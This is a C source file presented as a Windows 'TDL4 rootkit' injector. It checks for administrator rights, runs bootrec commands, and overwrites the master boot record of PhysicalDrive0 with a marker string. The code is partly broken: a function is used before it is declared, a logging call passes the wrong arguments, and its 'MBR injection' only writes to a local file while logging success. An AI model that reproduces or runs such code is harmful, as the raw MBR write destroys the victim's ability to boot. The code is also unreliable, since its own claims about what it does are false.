#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <time.h>

#define LOG_FILE "tdl4_injector.log"

void log_error(const char *msg) {
    DWORD errorCode = GetLastError();
    FILE *logFile = fopen(LOG_FILE, "a");
    if (logFile) {
        fprintf(logFile, "[%s] ERROR: %s (Code: %lu)\n", get_current_time(), msg, errorCode);
        fclose(logFile);
    }
    printf("Error: %s (Code: %lu)\n", msg, errorCode);
}

void log_info(const char *msg) {
    FILE *logFile = fopen(LOG_FILE, "a");
    if (logFile) {
        fprintf(logFile, "[%s] INFO: %s\n", get_current_time(), msg);
        fclose(logFile);
    }
    printf("INFO: %s\n", msg);
}

const char* get_current_time() {
    static char buffer[20];
    time_t t = time(NULL);
    struct tm tm_info;
    localtime_s(&tm_info, &t);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &tm_info);
    return buffer;
}

int check_admin_privileges() {
    BOOL isAdmin = FALSE;
    PSID pSidAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&SIDAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                0, 0, 0, 0, 0, 0, &pSidAdmin)) {
        CheckTokenMembership(NULL, pSidAdmin, &isAdmin);
        FreeSid(pSidAdmin);
    }
    return isAdmin;
}

void modify_mbr_raw() {
    HANDLE hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk == INVALID_HANDLE_VALUE) {
        log_error("Failed to open physical disk for MBR modification");
        return;
    }

    char mbr[512] = { 0 };
    DWORD bytesRead;
    if (!ReadFile(hDisk, mbr, sizeof(mbr), &bytesRead, NULL) || bytesRead != sizeof(mbr)) {
        log_error("Failed to read MBR from disk");
        CloseHandle(hDisk);
        return;
    }

    log_info("Successfully read MBR");

    // Note: This example simply writes a custom message, in practice, you'd need to modify the bootloader code
    const char *bootloader_code = "TDL4 ROOTKIT LOADER";
    memcpy(mbr, bootloader_code, strlen(bootloader_code));

    DWORD bytesWritten;
    if (!WriteFile(hDisk, mbr, sizeof(mbr), &bytesWritten, NULL)) {
        log_error("Failed to write modified MBR to disk");
        CloseHandle(hDisk);
        return;
    }

    log_info("Successfully wrote modified MBR back to disk");

    CloseHandle(hDisk);
}

void inject_tdl4_mbr() {
    const char *tdl4_binary = "C:\\path\\to\\tdl4_loader.bin";

    HANDLE hFile = CreateFile(tdl4_binary, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        log_error("Failed to open TDL4 binary");
        return;
    }

    const char *loader_code = "TDL4 ROOTKIT LOADER";
    DWORD bytesWritten;
    if (!WriteFile(hFile, loader_code, strlen(loader_code), &bytesWritten, NULL)) {
        log_error("Failed to write loader code to TDL4 binary");
        CloseHandle(hFile);
        return;
    }

    CloseHandle(hFile);
    log_info("Injected TDL4 loader into MBR");
}

void execute_system_command(const char *command) {
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        log_error("Failed to execute system command");
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    log_info("Executed system command: %s", command);
}

void inject_tdl4() {
    if (!check_admin_privileges()) {
        log_error("The program must be run with administrative privileges.");
        return;
    }

    log_info("Injecting TDL4 rootkit...");
    inject_tdl4_mbr();

    log_info("Modifying MBR and BCD...");
    execute_system_command("bootrec /fixmbr");
    execute_system_command("bootrec /rebuildbcd");

    log_info("Modifying raw MBR...");
    modify_mbr_raw();

    log_info("TDL4 Rootkit installed successfully!");
}

int main() {
    inject_tdl4();
    return 0;
}